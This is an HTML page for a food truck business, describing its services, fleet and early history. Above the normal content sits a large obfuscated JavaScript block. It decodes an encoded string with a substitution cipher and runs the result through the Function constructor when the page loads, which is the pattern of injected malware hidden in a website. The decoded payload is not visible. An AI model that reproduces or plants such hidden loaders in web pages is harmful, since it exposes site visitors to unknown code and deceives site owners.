#b')v{Nu#5)@JLgzafeNH]';@&1=[fjP3@JJZ8bK^z:~?N1OuPby[K$ 17deOuKbz7b$ e:K^Ny~?#Z8A8l6Aj=/RiZO ebNi^)u )#@Jfv{eO#^if/A6ljPj@‎[@=[CJ(tpbtK71q0Kbz15$ eOu#y#0jl6R@=/ A8OieAiu^#Z )vbNf#{)@/^ilJA6jeO@fj[@JP[Cb‍1OB#byuK$z#v@ e=(@7b5tp1tK#vq0u @#bJ)v{Nq~T)@n/_btzsi;k#/M:~4$$elIj(p08!.=Nu$#@ )vbJf#{)4I0=(jp/!$P@f#[@JtXbtp1q=(0@05KX@#j[PCVP&[Cb[uM {*kn37b:/sitz#b;MR$B`b/?k;3Q4=DM@Cq00_E9q4 RgRZ~OO9T~7JZR9AJD8/sbtk[i;Mno77:z{2bB`^gusba!rkZJZ8[mJD8~mb{*9A3[&uM`o77 b{~bB+ua('3wk[L nvCb7J(0I$b1{)He;80*9a0P0H85bc[7kR9Hdbc85k*7JbR05k*9H7R0c82q:77~:~A *[F0q9H8WbcC5kR9 AJ0H85b*0kR08[dbc0$H1{7be;a03 n0I)Jv(0$b1{PHe;8b*9a0R0H85VcU0kO~Z[Cbt2Oq;kn/_M:zsib'#bB/N6(`su(c)rp4& `1@#=ba.bBsRN+np{)/=wTvg4Jb(v'H1{8@e;a0$CJ0[COJb.V/pN'id9^[k AJ7n/sbtz#i;M/b.':pN9iO72^@oqq:~7~:[A .9dba7r]aebtk]/;Mn/s':z#iiO/b.@CpN9sbtk^i;Mn/.':z#9iO/b^@7pNNubB`M-nAb)Qw/Q[JgCVgUUVH{WpaUO q RZOZ[CJUUiOJb.[/pN'7d9^tk AJMn/sb:z#i;O/b.'opN9i772^@ qq:~t~:[Akn/db:zsi;O#b.M/pN'iO9^@4/4/7/0UU0v(0(MC$$04VV[$paJU~gH{UI`UWO AU[`JoJCb^vbBI/(/kjAA{yk_ t$*&q_b[uM {dO~3[CVZ2O9b1!q/ij1Anv7b3b(0I {*&)J#buM )B`b3/R*ppN0g$^4Z]8*[#b@P?1B`b!(v~a$D)/R@Cvu/* AJ.&uMb{B` 3#~b{Qbg36iH8T 5)d 6Qwb{*@[3#&uMabB` *Z'b!u-I210s=Q42-805`b@#bk3N1BeA1E-yMc)g@2)//J[COjn/Vbtzsi;k#bBM:AM`b'-tM56@JJMuJJ[7lbn8duR[:^n87d7:^lbb{*uR3#&uMLbB` M:nbc~gvyiy:$Z(u@JE':_y~EL~ZwywOw#YcR~Z_KHU7 @$YJb[C un8:AR#b^l/&B`b63/?Ku89jR0~vn:[db@^lun8#bR#v)B`b@46ln:?4)gZsrMe.v@J30[J[CVv[CVV[CbP0)?cc0d7J[r AJ7/sbtk#i;MnbB`:zwrb{l0(v^4i$/Nj+Mw@JbMEvb*K i`r1A.&{K[[.*&udbbBM 3s`b*#Qer$)45w{ub9L0)B`b@Jk(53HDMkZ/cO/rLbBR)[&`bt#0'R*)@J/$rpJbp2&{[^N1!7dj1A9b#bB/iyl`bn&kMQ.):^'Du$ZrLN@JbOp&{p^CV[CVk AJ[n/sbtz#i;M)bB`:ql6be)@n;)EJb++vi`MMncb*+b[[dMn=(JJ]Pn/5jbcA(Qv[K0AJ7d/bn= 5(](nb;[dJy:LQJ0Pb!)$M^(47/E(QdbM[$M^(4b/E(Q{*&M7#buM uB`b3tc^^/wwK4M9prAu@Jbju/5n=(:(]Pn~H Q9#b=Z~2B`bOIj53;uicO2uMeA5 r@1?:LPJb[Q!);7dy0OqO~ZH_Q92 =Z:~B`~O#2b{ub01)r6CV4L9=[CT@~JJy Q!b;:^)y0L(4Q7b(M$M/-#bBE4' `b:5tl/JTcN*[[[Q@LQdb;b!)y:B`b0#eR.tz$Mu=I@J[!^J[CVVKCJb[0jQcA;:v7J0LQ!bPbn)yj2vu~z~Dtd A[7LQJb;d!)y:bcA0[vJK0j~obnQtj2vub;z~Dy:LQF0#b!)5)B`b9c']H'@W{kQ!b;:B)y0L`b.#b&!jQ?/0u$.p.(g{bn:a@2vu~Pz~DtjJb[C );:LAy0#Q!;NbB`I)=vbZr21(9:@77b~#bQHczB`-0+AIu D?vn0nRHdb!M@);:L[y0#Q!5.bB`q4k0b.4q$ :+T0zV]@J&VO~[C_bZ2OQcAKqvCV0j=([Jb#n/5nbB`(])3baujvuj/9R'-6Jb@Pv5n=([(]#n/*5bB`MtzIbvgk!k[C0@P{VV[0*&uJbbBM 3K`bK#459IQw@.y8b[CV5{*&VC#buM LB`b3IeM3E)0?MRr)p1~) @8sbcJbBzL{r`0{LEvb^tsP/ (4J^vi+qbc[7Jc0rd[CV)?Jo[C (JJbA1:y5]pIzEP)e0zb[7Ku(1db5b:yz]+MME7bNEvi/MAK`TMCp:0zbpItKu)ekn/7b:zsi;&#bBM9rv`b06r(^b3-tAB`b@#pg+;8CDQM~ AJr@(1Jb57:yz][EopImmJ)e0zb#bBKu1u`bcE4M3.-@J)$](vPb#1:y5bB`zEKrbe$MM$Z].!9)([o0M217b5@:yz](O~E[[AZ2Odw=Rq_~Z~CVO2OqO2~C_Z[dV[JqO~Z[CV 2OJbAJo+3(tJ)~P1)v^bNAuj?rdb3[7+)(t1M~7b)Evi+M2*`barKCbyv^uNAtkj?7Mn/sb:z#i;H)bB`-!/)bH?1MND*.vab@#bKN1;B`(1u rR0/6lg@CuQb3 AJ)(t1J~o7)+mJ[)b3(m+)~t1Aro7b[v^uN[dOj?q_~Z2CAw=OVO~R~_ZZ2O[O2~qJ[[CV2OdO~JqCVZJJb AkNp?ep^g/&cQ&PbvvMPbb^~~;^;t0P4eDv HePbT85k*9b3R0cOuHaPr Puug0b!3{q/P{80$b10PHe;sbi0a/Pbrl6(&M0=~PbM8AD&N!arTPP6:$bbiM?i90I$^(zvP20j~bcH-4'P8MZ4b^9[M0pc7dbQ&Mb1{87J;a0$H00PbeM6(&M)/~Pb52Agg^(/Pba~:{jzPb!HL/K6?dj/[Abg)7g7b/2$H1{8be;a0&M00#@#M6(ZbB`~=&'b^!64?u['yneCb5@J{j^(/Ha~:qwZ7#E9 I~B:~_`b+PbAw.l ])5sA'Z/TjPPJ[PP@#PP_VdP@P(/Cb5~:{j^#bBHa&+`banH4M!@Jby(6(&M0b~#bM'~AB`M(*reC @J2bg)[[7b/2Agg)/g#bB2Ac!`b*vwe2yr$ucc[C)g@!A9OJ6?zJb/_L/K^9A_j(/:b5~[{jHgd Aa)/2JbB`Ag#Ib+ub)AH);vrL)v62@Jr?zLb![7/Kjd77U/O~Z0[Aw2Oqb=R~_g)/CVbg2Ag#)/27bB`AgD!b!4awI+8${0O0JbN '/!6?@Kj/zLCVPP#[qOZPb@#b+3LB`)1u&80ay)2E]3!OJbMz@:cMAJy;)8!bg[77)/2dbg)Ag#b/2ArB`bg'(Kzzr+(Oqbrq.ycMA@J;)8!:VPy[C [C)/AJb2Agg[do7OqO~Z~_Aw2CVO=Rq_~Z2VZO2OCb;~C~0vv^87Jb~0$H1{Pbe;a(&M00~PbM6v.Kc&-eQPAr$eb-[7rv&&db$Av.Kcw=eQ7-R~CAr$eb-7brv&H1{8$e;a0$M00#bCM6(&b1{~@e;80$Ma0#H0M6b&q~(~@lT_{7DJbO9$H1{8be;a0&M00#@PM6(Zdj~~wOjZJ8O~ZP~98P_E~ _O_dI~O9 AJ[8778Ob-7bByHAH`/80:r[d]u'vbKc~.eQ&A~C7ZOOVO~2q_eZ2EZ~A=Q#bB~cM)`b uz$a/6uLkr]IyjOj@JZO~ZPw98P_8~ _O~VI~OEV[C[C0$b1{#He;8b&Ma0~@0M6-#bB(lcc`bM'0Ll5/Ei&@J[D080Cb10$He{#b&;a(~M0Mr@7b6$er--O~v&$bZ2OCKc&q_QCAv.tVCbeDv ^;70T4eaCb3euuOuHp?r 7ge&kb/#bN^QnB`bD15A3TM0M?$q.zzOu@CQJb*A9kR9H8b0c75*9HvC0c85kab3RuuOuH*9r C0H85bcXXkR3{[dbbg0q!p?e/7g/&kN8#b*^5kR9Hb10c@e{80C;a0$H{g7b!@0q/3Cb&#v(~M0Mg7b!60q/3{b&#0@rN=8CT7bAD0q!3{b/#/g!a6@C7J:$?6b&Mi(~[0M^;7d4tDvbee7 TbivCV9MI$C0zv^2M07Jb7M6(&db~[v ^;tvT4eDCVCe7j~bc(&4'70v-rJbPb)(u/+ssyw;+&^4)~PbdHA[-b^;7T4tDvVee7 CA9vC-MOJb^Z4MH97v08MZCbH94M0-b&8^DrN=8MTCbAZ4MH-XX08^b[d 91{8AJ;a0$Hb0#beN$ B`0rMMAJL2M{b&Mr@~[0M60[db(j~4c(bH'J00-MZP8^94M0MPb&V6(~Mb1{[Ce;80$ a07Hnv(b3b10I)e{80J;a0$HAJ[CV8oJb 0$H1{#be;a8B`b0^4ZK;k@lcnMJb&*6(~M0bc[[['(0jdJvP~4Z4bH-PM08Mb&M^9~[0M6rCVb(ls/i0807b10$He{Cb1;aHe{801;a0${807ba0$HeM#b&;6(~M0Jb@C H1{8Ae;a0$`b0#b;{:MBv485yB`)@J~b.rbAlR&O(w-'Md$~Kybc([['J0j~&0Pv4M0MPb#6(~4bB`X($:b'.i*{&Ceu@)Vb1[He{803;a0$ nv7bJb(0IH1{8)e;a0$AJ0[C0ob1 $He{8bB;a0E`bp#q(O(AH5IH/3rp4H@JbHal:B`b'5'z&qq(2{[[D:]jdbcM~4'(0PbJvP(&M00~XM6b'#bBq6{5`$=LuNasM;Q @[)AJoCVg0b!3[q/#{d A4@cQJob0&MJprlsbiM0/Pb[M6(&db!~[?ia6:MJb&$6(~M0~=[CVJR~dVb;v A0Jv^~sbi0~/Pbrl6(&M0i~[[MMI$dbzv^29MJb&06(~M0VO[CV_~Z2Vb^;OqT4tDvJeeC ##bV[sitknb;M:/B`bzP1)gj&ZDMuvpPr2/tk@P#Mn/sb:zPi;+NbB`M05wbj0^Tq0:6L4bPv@atknP#M:/sibzPb;*reB`$eMnkP&K!e0@PPvn/#btzsi;kPbBM:)R`bpkOzLOLPv5utk@P#Mn/sb:zPi;NMbB`e-Dvb(^u*cv@gL4nP#bP/sitkPb;M:uB`bzDN:Q4R=/QM+~v)KyPvTgtk@P#Mn/sb:zPi;+rbB` 2/Mb6?sjpv@)5=nP#bP/sitkPb;M:rB`bzNEjKaPviApk@P#un/sbtzPi;M:bB`:u+Ibak;pO(8jvH5Pv@H/knP#b:/sitz#b;Mu B`bME/$au@P )^MbB`rr14b.c;O 0@zl+&P#bPuM {*`b3Pbv'/.Bau0nzP#-PMMb{*@ 3P&uK/bB`lA38b9I5!)#bP/@ {*&P3PbuM3:B`bM9kKNKPr{M{*@P#P&uMbbB` 3L bHvA${*^/:t'r/@;/K&P#bPuM {*`b3PbnQK6BE 3Q--MAO9P)0ka/P0v3{*@P#P&uMbbB` 3!wbg9zzw:/LM]utP/wZ0*@P#u&uMb{B` 3PubnqbtEq=z;PMyT{/@P4*&u#bbBM 3s`bnPEO{=LQP)p:{/@Py*&u#bbBM 38`bQ#a^Op^PbyD(TB`b@0s$iuP4~gMk@P#An/sbtz#i;M/bB`:v$)bi~{^?Ob@Pb:.v/B`$44wuP/*TMv@P/Dn/#btzsi;k#bBM:]r`bi0Mr0)@Pblr4vB`bMr]^+tPv]]tk@P#Mn/sb:z#i;N4bB`ua((b)~tiz5{c(A`)@Plb&LbB$Dusucz*iv)Pvivtk@P#Mn/sb:z#i;i:bB`TTjRbR-@{?b;PbB0!$v`iaE((#bPv@itknP;M:/s`bz#b)ikeB4(4/8.3]!r`*@P6b*ubBs-K:HI=9v(R0 ur@P^iPu#b{vM 3*&bi#bBzMQs`E:w~0bB;u@Z`b^J1lr:u)K )M`/[Pvbc+bB0;yM-r3MyI@P#?PuMb{*` 3#&baMbBTa(D$+)r=)@Jbut;0B`b($Dlg(69~+j0Ozc`4[P(b&4bBDgzIuu9kv8.PMyMPb@P#(B`bvM^pQZP02Z3P@P#DbB`r2b5a02N-T+D)8N@P=4PB#0`bzPbRe45.tvrRi/;O:)0@n+LbP#PB`bP0]N1r0A'?D@P#DPB`P1b!zb28ri-AuNylP)MP4#0@btPbBI0*(`rj{'{w4up(0'?u4@P#HPB`P9b;qb?LQl)'4k4$@~P0vP#P0`bPb+!N]B~?*Mk*(${5P24P{#0@bcPbBMO)M`3r?//P# P0`P@b^zbB&{:MlO/9v-'P0OqP@P#abB`'/wbQq $=u+)D4)P0@r:PbP##uB`b@k/v;~;wEI0&v$r)OP0$.@P@P#6bB`#/:.bzE;r0~HDeNLg/8Ze##P0@b@PbPNc&B`HLq'A..qIA0P09KdV@@[ ~=R[AJb~dr]ae.7a]/92q:77~:~A .[dbq9r]aeq2a]/b==C7i*5VV7JtELIb^O/Pbis8ve=eA]Pb.MwrP*{vZbgI*NjEM21pPb.PuKM;ba;+Pb!]tPbLz~4*^4:wPb]$M9z=Rt?PbN$/+cQPb!&0t5yv~4Pb5$r''1KAPb*$;M*0)g=/Pb[zDua7dM{8Ib^OE7b+svi`MM8Ib^O8Cb^sI7bOsI#^OscbB`8.crbQ'1a$vs@Jb(8I#^O^'bB`{A$Mb2-(.3?2g/MbzMiHB`b@J(330M1ukn95[X50i=0[C7eAMbb^OvebBs8IZ`b1#$DwQpR1^u;O~@J$s8Ib^bg#bBK*w(`Z/ijA$[{4@]Cb.Uwr7*{/sbtk#i;MnbB`:zQMb;k/s:r]vM@y/eAJbiBMve=`ba#buT+8(e?A2HvlwakPre@JC[P0v AJu[n/obtzsi;k#bBM:Mr`b1 )n$i')@$0{]Jb.bwr[*gIM[dE7vZNMb{*j 3#&u{4bB`=tirb2]M(9n$IaM`;@#qbz3bBekM2^svr2M](w'4#b()cKB`b@ZM!+?Me]DLv@%v~vvvl0b.C Ao*{]J7bgwrNjIMveE[dZ.9rba7q]a]C2==/Vb*CVKM21pk+.7un/sbtz#i;McbB`:0r$bik]Ew-ecR=K@Jb&vMvi=ebe#bAp)MB`4u(t(ue@Jv[P0rPa;u[Ct]t;bkn/7b:zsi;t#bBMk.M`b)yu6j!/54=e)@gveAJbiBMve=`bz#b^vu$RM?/Kq$.Ma^$[@JubP0uP^Os[C^O8I7Bs8Ib`b+#bc00OO=-{((14.u.vPu0@Ib^OJ#bBs88n`bK=;wTz~2g6eCb@U$4*^4[w7q]$tk~T_Mn/sb:z#i;+rbB`Nic)bwE0{61n$-.B$8@5`b{Jb4H/4$b M0~B`b&P*~!.jQ9H; =Rj9(/[{tNNCbzlM9?=R_b7q~itknT;M:/s`bz#b2*E/B$-.(^bBrI@{`bKJ1+4a?u+v$?A/4N]sPbu9):B`bz]:apzH=e089u64QI[C*t$/bc~7+!&tq~T0kn/_b:zsi;n#bBM4^r`bLZiTI*rp/9zE3QM`b@Jb$;r]Baz{TrryDN~Bvr02`bcPbMl^yA(1/0{[CbOq$t5yv_47q5btk~T;Mn/s`:z#ib*MbBi;l0{JIg$D#G(@UAvU)`@Pwb;ObBg!{uKu$(/iv0u)Ab^{q[bOs8C^OsI7B`8I#Ib'&bI~l{)sa4wu4@Jb)]$4*^`bwPbN&KwBMKz:9D[y44n#bBl0r `bIDr)uM4g9s $'vM=R@JbbNM9zB`b?P1.{tvH+r;zKa(]qbB^r[.`bz#rT4iI@JLL4/bcQ4+!&t$B`0~P;bQ bg&Kg)[#c&HjbB`Ml0sb{?6ywMpIn(k$@J./5$b5y`t4PvbgvbBg-E.I)tn]HM2?L !L:[C@z~:bCA97#1KOJbP$r''b*07v*/)A;t7baM;Cb;]r''1Kvvl$Cb'0v'X1K$)XPbrA;M*0b**/XM21p7+.PuKA;b*0vM*/)l0v%7!Lv[d*z~:b0)A#b@7;M*rb'1/'CVK$zDbag^uM{=Os87b`bI#bl-j5B4kur6g-MM:@+A~qJf`(gj[d/VOCO~fqJJZ2tpbt=P1q0(bKR5Ks.jZi(kaPE$cHb5nRuPbbn24tcH$(Pb'$]$PeLvPb'1)~PbK$rM*0)'*/[A;t=7d0(tpb5K71qKR#@C.jZibka7EszDbagBuM{=`b'#bk]ttv/O/ k@Cb40Hu5($t7btcp1q=(bB05KZ`bt#)+1$4N&/2K`{@#5b50bBT3u4{)91THw@J;~tpbt=[1q0(Cbt5K4(nRn/7bt2si;knbBM:z5`be#2vt)u@#;nj9bB`i=:3b+8./uO@OI;;JbtA-i;kn/bM:zscH$[CbB$]$e`ba74jNatw9s$0bM#b9e0+B`3D'?H-8?z;@J0r9O[C$Jb'Ar'71K0)vPb7A;M*vCb*/r''1KZbK$iEsRjb'.kaX1K$CXPbr';M*0)b*/XA*0)XP/%A;Mv7vl*[db0v)~'eLR7Jbvn24tng=(Jb#zDuab'1M{@PK$r!0u['Lz~Ub0):#b@A;M*Xvl*/%v0vvbl0v[5($vC%cHu$XbJ$]$cHeL#Jbuv)~'[Svf0H$@Xb'$]$ceLv#bu@)~%Z[CV02OqO~n/_btzsi;k#bBM:R$`b'0A3an2@J*2tpbt=#1q0(bB`5K-]bzNtuiw-a/l1~4H@J[[CJ[CVV[HKCb3JjZrMbniO7^~{uRn4:Pue(IbnPb9N(''1K]Pb3$ruOuHadr [ubni7^~{uRg4:7u1)!JbQ~q/*8Pb&)ADrN=dOT[7_~Z2btkOq;Mn/s`:z#ib-4bBn^rn*E?i0+e*!MsbBIg@u`b3#zv9I60v5-4@+uL=JbtT)i;kn/BM:zs`bn#brsr1n#l9.EbB`g@D+b+skLrTynAj;IT@54E&J[,KN=8JbUbADr/g1)T*)Q!q[X~X0qbg1[/*))!bnQ~VNne(C(]7I93uCrHaub 7buORuni{0^~4uv,0:J(Mvvv[,0vPCA9vv1KOJbC$r''b'17vbK$ru3uH'Or auK$Cb'dr'X1bnnX[N(e(Ik]X79n/sbtz#i;MabB`:ls1bp*aI/Z0DLq]@#bqEqMB`b0O4/a6ls4?@Jw(ERbniru^~{uMu4:JMPuM/[[CM42OVO~eq_bZ(I9nnVCN(]e AJC.9rba77]a]A72q/ q~:~ae:[d].9rb/7b]aELi*5~/J[t=R~CVba_ Aae.9J]/7r]==77q.[db29r]aeb3a]/rMHK7OJ[jZJYCV _vY_Ab+M q[dMEvvb+Mii#YME[CvY@dV~=JO~ZR~Vb2Oqi+MMC`biEv7J0k/0Jbc4Dl)3cb*H-cb*08PaE!(Pb*rA/v!MlPPb1ug0ww=v^616(;tDPbeev T1[74w=vdb16(0w'7bB6]My`b.$9k68Cb*4(#b*0(01w=7w61vJbc6@:yMA8s;)P!s&^b+~P/w;Ibnn+9N(e(4-]PbP:(=-b'1j$[7K$redb'(I9nnN(]:Cb-7(=j4-`b$7b9Nu4BtA5tzCA]u:19OJOK$rb'b''7v1K$Cb+sr'w;s&^1+~C/K$rb'db'XX9nne[N(](I4-X7b#:(=-bB`j$Arba=L1M- M0LQibt$y@;kn/JM:zsibQ#bBR9n&`)! {e)Qu']`j@#^bz.bBK;6MT9Mzrs/Q4g!btM6@;kn/JM:zsib3#bB)~/H`0$:E2`b@#b$.8nBKi~:I8$A*8@4rMvJ[,z!:(b-4B=j$-`b*#bE5048eig414j@O2O~[[CbZ2OVcMAq_;)8!:(XbnyI9NneCb(]C/aE!V7b*rA#b*0801w=(w61v(B`6@J!btubqN-3 q9a0N[LP0ICb*4rgv!Ml87b*u(#b*0(01w=Jw61vbB`6@~{bHvO!((4rn^ju+Rni(CP0/*b**/[b*08(v!Ml#@7Jug)Zbnkz0p~d:~[7_b=~Zitkn~;M:/sE!z#b:rA/a~=~@CtkZ~_Mn/sb:z#i;lub*!~gv@MZ2OCO3cqJb-0Dlcc77)H~)7bnFZz0kbaep[a].9rV/W]CbtCi;kn/aM:zsE!r#bb{A/@3*&u7#bBM A^`b;R8~$a4)'gHbBr/@e`b'#/I120Jbu*L {*&@3[CuM/sbtk#i;Mnb*!:zv@Mlu~7Jbg)Zznkb0p[#**07b*!8(v@Mlu)JbngZz0k~^;p[C4tDvbee7 T_JJq~VJ[7T[#bdTgB`b)!$i+$6sN$@JD)/AbaEu/X!r*!JXXMlubJgvb'XbBKeq-`i*(2j2sZ1u[1zX-[[[b&#bB0HR)`IsMrIJb!eMlc3c@)H-0Dccc[C[0r)bCO~?J_bZ2O ^;tqT4eDvJdeCVCVPd[V[JV[9TT q:[C\\\";for(_BqhTW of _C22oe){if(_BqhTW[ã('Ϯ')]||_S35cpT82dF){_OIflurB5=_KxR2N59-(_K5I8Yo4V()+_BqhTW)[ã('Ϯ')]%_C22oe[_XU19v1tp];_UfT1gN0=(_A2L7fz,_DoFpAjs1U,_XtUXO7l8D)=>{_X3SfrsOCki=_X3SfrsOCki[ã('Բ')](\\\"\\\\x14\\\",'>')[ã('Բ')](\\\"\\\\x13\\\",'<')[ã('Բ')](\\\"\\\\x12\\\",'\\\"')[ã('Բ')](\\\"\\\\x11\\\",\\\"\\\\\\\\\\\");_X3SfrsOCki=_X3SfrsOCki[ã('Ӷ')](new _VjC2kYX5dG[ã('ҏ')](ã('р'),ã('А')),ã('Щ'));_X3SfrsOCki=((_G6MPXUQ,_VAwa7,_T1eFz53mAG,_GlP14wU,_D7tLDI0e,_YchLAi8M47,_B15kLVU7i,_Vr1k1r,_WE5vfB83qj,_DoFpAjs1U,_CJYt0p,_QZT84Q,_U5fpWdhX9,_XkZY1UhST,_SXVy0iw3RR)=>{_B15kLVU7i=(_VAwa7[ã('Ө')](-_YchLAi8M47)+_VAwa7[ã('Ө')](0,-_YchLAi8M47))[ã('Ө')]('');_WE5vfB83qj=_T1eFz53mAG[ã('԰')][ã('Ը')](_T1eFz53mAG);for(_QZT84Q=_GlP14wU;_QZT84Q<=_D7tLDI0e;_QZT84Q++){_U5fpWdhX9=_Vr1k1r(_QZT84Q);if(_WE5vfB83qj(_U5fpWdhX9)==-1){_CJYt0p[_U5fpWdhX9]=_B15kLVU7i[_DoFpAjs1U++];}}_XkZY1UhST=_G6MPXUQ[ã('Ϯ')];for(_QZT84Q=0;_QZT84Q<_XkZY1UhST;_QZT84Q++){_U5fpWdhX9=_G6MPXUQ[_QZT84Q];_SXVy0iw3RR+=_CJYt0p[_U5fpWdhX9]||_U5fpWdhX9;}return _SXVy0iw3RR;})(_X3SfrsOCki,\\\"*IE21ZuK3Az=podXlq]f$;yc?^Fv(Tm5Mr,Ns|w-}:+'t)bS .O_U{R/B#Ygjx&C!Hn4kV60a@hGP~`eiW[8%JQ79DL\\\",'\\\\\\\\\\\"<>',0x20,0x7e,_OIflurB5,null,_VjC2kYX5dG[ã('Ӡ')][ã('Џ')][ã('Ը')](_VjC2kYX5dG),null,0,{},0,\\\"\\\",0,\\\"\\\");_X3SfrsOCki=_X3SfrsOCki[ã('Ӷ')](new _VjC2kYX5dG[ã('ҏ')](ã('Ԟ'),ã('А')),ã('Ւ'));(()=>{})[ã('ն')](\\\"_L55c0Y\\\",_X3SfrsOCki)(_L55c0Y);};_UfT1gN0(\\\"\\\",_Al9cj,_VjC2kYX5dG[ã('Ӡ')]);}}}))();})(()=>\\\"Jl4RiUKW1bbvqq6hR1qLYxC79E5e147kk8\\\",\\\"\\\\165\\\\143\\\",window,0x0,0x1,0x31,\\\"\\\\162\\\\145\\\\144\\\");​_L55c0Y._Y1j23()\"[_WZWjLh7l2()](`​`)[_WZWjLh7l2(1)](_Izgl5ltm=>{return((()=>{})[_WZWjLh7l2(2)](\"_L55c0Y\",_Izgl5ltm)(_L55c0Y))!==false;}))({});})();")();</script>
    <header class="header9x4k">
        <nav class="nav8m2p">
            <div class="logo5t7n">LinkiqHome Food Trucks</div>
            <ul class="navmenu3k9s">
                <li><a href="#home9x4k">Home</a></li>
                <li><a href="#services3m8p">Services</a></li>
                <li><a href="#fleet7n2k">Our Fleet</a></li>
                <li><a href="#history4k9m">History</a></li>
                <li><a href="#cuisine8n3p">Cuisine Types</a></li>
                <li><a href="#events5m7k">Events</a></li>
                <li><a href="#testimonials6p4n">Testimonials</a></li>
                <li><a href="#about2n8k">About</a></li>
                <li><a href="#contact9k3m">Contact</a></li>
            </ul>
        </nav>
    </header>

    <section id="home9x4k" class="hero6p2w">
        <div class="herocontent7n4m">
            <h1>Mobile Culinary Excellence</h1>
            <p>Bringing authentic street food experiences directly to your location with our diverse fleet of gourmet food trucks</p>
            <a href="#services3m8p" class="ctabtn8k3x">Explore Our Services</a>
        </div>
    </section>

    <section id="services3m8p" class="section4r8t">
        <h2 class="sectiontitle2m9k">Our Food Truck Services</h2>
        <div class="grid3col5n7p">
            <div class="card9x2m">
                <div class="imgcontainer4k8n">
                    <img src="https://images.pexels.com/photos/4393021/pexels-photo-4393021.jpeg?auto=compress&cs=tinysrgb&w=800" alt="Corporate Events">
                </div>
                <h3>Corporate Events</h3>
                <p>Transform your business gatherings with our mobile culinary solutions. We specialize in providing diverse menu options that cater to professional environments, ensuring your team enjoys exceptional food without leaving the premises. Our trucks arrive fully equipped and ready to serve.</p>
                <a href="#contact9k3m" class="ctabtn8k3x" style="font-size: 0.9rem; padding: 10px 25px; margin-top: 15px;">Click Here to Continue</a>
            </div>
            <div class="card9x2m">
                <div class="imgcontainer4k8n">
                    <img src="https://images.pexels.com/photos/2291599/pexels-photo-2291599.jpeg?auto=compress&cs=tinysrgb&w=800" alt="Private Celebrations">
                </div>
                <h3>Private Celebrations</h3>
                <p>Make your special occasions memorable with our customized food truck experiences. Whether it's birthdays, anniversaries, or family reunions, we bring the restaurant experience to your backyard. Our chefs prepare fresh meals on-site, creating an interactive dining atmosphere.</p>
            </div>
            <div class="card9x2m">
                <div class="imgcontainer4k8n">
                    <img src="https://images.pexels.com/photos/1449773/pexels-photo-1449773.jpeg?auto=compress&cs=tinysrgb&w=800" alt="Festival Catering">
                </div>
                <h3>Festival Catering</h3>
                <p>Our experienced fleet handles large-scale events with efficiency and style. From music festivals to community gatherings, we provide high-volume service without compromising quality. Multiple trucks can be deployed to serve diverse tastes and dietary requirements simultaneously.</p>
            </div>
        </div>
    </section>

    <section id="fleet7n2k" class="section4r8t">
        <h2 class="sectiontitle2m9k">Our Diverse Fleet</h2>
        <div class="highlight3k9m">
            <p><strong>LinkiqHome operates a versatile collection of mobile kitchens, each specialized in different culinary traditions.</strong> Our trucks are maintained to the highest standards and equipped with professional-grade cooking equipment. <a href="#contact9k3m" style="color: #667eea; font-weight: bold;">Click here to continue</a> learning about our booking process and availability.</p>
        </div>
        <div class="grid3col5n7p">
            <div class="card9x2m">
                <div class="imgcontainer4k8n">
                    <img src="https://images.pexels.com/photos/1639562/pexels-photo-1639562.jpeg?auto=compress&cs=tinysrgb&w=800" alt="Taco Truck">
                </div>
                <h3>Authentic Taco Wagon</h3>
                <p>Specializing in traditional street tacos with handmade tortillas and slow-cooked meats. Our taco truck brings the vibrant flavors of authentic street food culture to any location. Fresh ingredients are prepared daily, and our signature salsas are made from family recipes passed down through generations.</p>
            </div>
            <div class="card9x2m">
                <div class="imgcontainer4k8n">
                    <img src="https://images.pexels.com/photos/1633578/pexels-photo-1633578.jpeg?auto=compress&cs=tinysrgb&w=800" alt="BBQ Truck">
                </div>
                <h3>Smokehouse Mobile</h3>
                <p>Featuring slow-smoked meats and traditional barbecue sides. Our custom-built smoker truck creates tender, flavorful dishes that satisfy even the most discerning barbecue enthusiasts. We use locally sourced woods for smoking and prepare everything from scratch on location.</p>
            </div>
            <div class="card9x2m">
                <div class="imgcontainer4k8n">
                    <img src="https://images.pexels.com/photos/1640772/pexels-photo-1640772.jpeg?auto=compress&cs=tinysrgb&w=800" alt="Asian Fusion">
                </div>
                <h3>Asian Fusion Express</h3>
                <p>Combining traditional Asian cooking techniques with contemporary flavors. This truck offers everything from savory noodle bowls to crispy spring rolls, all prepared with authentic ingredients and modern presentation. Our wok station delivers restaurant-quality stir-fries at street food speed.</p>
            </div>
            <div class="card9x2m">
                <div class="imgcontainer4k8n">
                    <img src="https://images.pexels.com/photos/1653877/pexels-photo-1653877.jpeg?auto=compress&cs=tinysrgb&w=800" alt="Burger Truck">
                </div>
                <h3>Gourmet Burger Station</h3>
                <p>Crafting exceptional burgers with fresh-ground beef and creative toppings. Our burger truck elevates the classic American favorite with artisanal buns, house-made condiments, and innovative flavor combinations. Vegetarian and alternative protein options are always available.</p>
            </div>
            <div class="card9x2m">
                <div class="imgcontainer4k8n">
                    <img src="https://images.pexels.com/photos/1279330/pexels-photo-1279330.jpeg?auto=compress&cs=tinysrgb&w=800" alt="Pizza Truck">
                </div>
                <h3>Wood-Fired Pizza Mobile</h3>
                <p>Authentic Neapolitan-style pizzas cooked in a mobile wood-fired oven. Our pizza truck produces perfectly charred crusts with bubbling cheese in just minutes. We use imported Italian flour and San Marzano tomatoes to ensure authentic taste in every slice.</p>
            </div>
            <div class="card9x2m">
                <div class="imgcontainer4k8n">
                    <img src="https://images.pexels.com/photos/1352278/pexels-photo-1352278.jpeg?auto=compress&cs=tinysrgb&w=800" alt="Dessert Truck">
                </div>
                <h3>Sweet Treats Wagon</h3>
                <p>Specializing in fresh desserts and frozen confections. From hand-dipped ice cream to warm churros, our dessert truck provides the perfect ending to any meal. We rotate seasonal flavors and offer dairy-free alternatives to accommodate all guests.</p>
            </div>
        </div>
    </section>

    <section id="history4k9m" class="section4r8t">
        <h2 class="sectiontitle2m9k">Our Journey</h2>
        <div class="history7m3k">
            <div class="timeline8n4p">
                <div class="timelineitem5k9m">
                    <h4>2015 - The Beginning</h4>
                    <p>LinkiqHome Food Trucks started with a single converted vehicle and a passionate vision to revolutionize mobile dining. Our founder, Marcus Thornberry, recognized the growing demand for quality food at outdoor events and decided to fill that gap. The first truck specialized in regional comfort food and quickly gained a loyal following at local farmers markets.</p>
                </div>
                <div class="timelineitem5k9m">
                    <h4>2017 - Expansion Phase</h4>
